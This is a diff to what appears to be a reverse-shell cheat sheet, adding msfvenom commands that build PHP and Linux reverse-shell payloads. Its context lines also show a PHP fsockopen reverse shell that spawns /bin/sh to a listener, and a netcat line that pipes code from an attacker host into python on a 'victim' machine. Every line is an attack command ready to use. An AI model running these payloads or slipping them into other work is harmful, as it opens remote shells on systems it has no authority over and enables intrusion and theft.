@@ -11,6 +11,12 @@ $sock=fsockopen("10.10.10.1",5555);
 exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 
+## MsfVenom PHP Reverse Shell
+
+```
+msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=5555 -o ./rs.php
+```
+
 ## Node.js Reverse Shell
 
 ```
@@ -60,3 +66,11 @@ Get the shell from Kali and execute it on Victim
 ```
 joe@victim:~$ nc 10.10.10.1 4444 | python
 ```
+
+
+## MsfVenom Linux Reverse Shell 
+
+```
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o ./rs
+```
+
